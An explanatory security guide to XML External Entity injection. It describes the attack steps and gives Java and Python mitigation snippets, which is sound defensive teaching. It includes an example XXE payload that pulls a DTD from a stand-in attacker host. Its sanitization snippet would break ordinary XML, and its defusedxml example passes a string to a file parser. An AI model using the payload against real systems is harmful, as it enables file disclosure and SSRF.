XML External Entity (XXE) Injection is a type of attack that exploits vulnerabilities in XML parsers. It occurs when an XML parser processes external entities provided by an attacker, leading to unauthorized access to sensitive data, server-side request forgery (SSRF), or denial of service (DoS) attacks. Here's how it works and how to mitigate it:

### How it's Done:

1. **Injection Point:**
   - The attacker identifies a point in the application where XML input is accepted and processed, such as XML parsing functions or web services that accept XML input.

2. **Malicious Payload:**
   - The attacker crafts a malicious XML payload that includes an external entity declaration pointing to a resource under their control. For example:
     ```xml
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd"> ]>
     <data>&xxe;</data>
     ```

3. **Parsing by the Application:**
   - The application processes the XML input, including the external entity declaration, and attempts to resolve the external entity.

4. **Exploitation:**
   - If the XML parser is vulnerable to XXE injection, it will resolve the external entity, allowing the attacker to read sensitive files, perform SSRF attacks, or cause DoS by fetching large files.

### Countermeasures:

#### 1. Disable External Entity Processing:

**Description:**
Disable the processing of external entities in XML parsers to prevent XXE attacks.

**Code Snippet (Java - Disable External Entities in DocumentBuilder):**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

#### 2. Use Whitelisting:

**Description:**
Whitelist acceptable XML schemas and disallow any external entities.

**Code Snippet (Java - Enable Secure Processing and Set Schema):**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
factory.setSchema(schema); // Set schema object
```

#### 3. Input Sanitization:

**Description:**
Sanitize user input to remove or neutralize XML-related characters that could be used in XXE attacks.

**Code Snippet (Python - Input Sanitization):**
```python
import xml.etree.ElementTree as ET

def sanitize_xml(input_xml):
    # Remove or neutralize XML-related characters
    sanitized_xml = input_xml.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    return sanitized_xml
```

#### 4. Use Safe XML Parsers:

**Description:**
Use XML parsers that are not vulnerable to XXE attacks, or use libraries with built-in protections.

**Code Snippet (Python - Using defusedxml Library):**
```python
from defusedxml.ElementTree import parse

def safe_parse_xml(xml_string):
    tree = parse(xml_string)
    return tree
```

### Summary:

XML External Entity (XXE) Injection is a serious vulnerability that can lead to data theft, SSRF attacks, or DoS. To mitigate XXE attacks, it's essential to disable external entity processing, use whitelisting, sanitize input, and employ safe XML parsers. By implementing these countermeasures, you can significantly reduce the risk of XXE vulnerabilities in your applications.
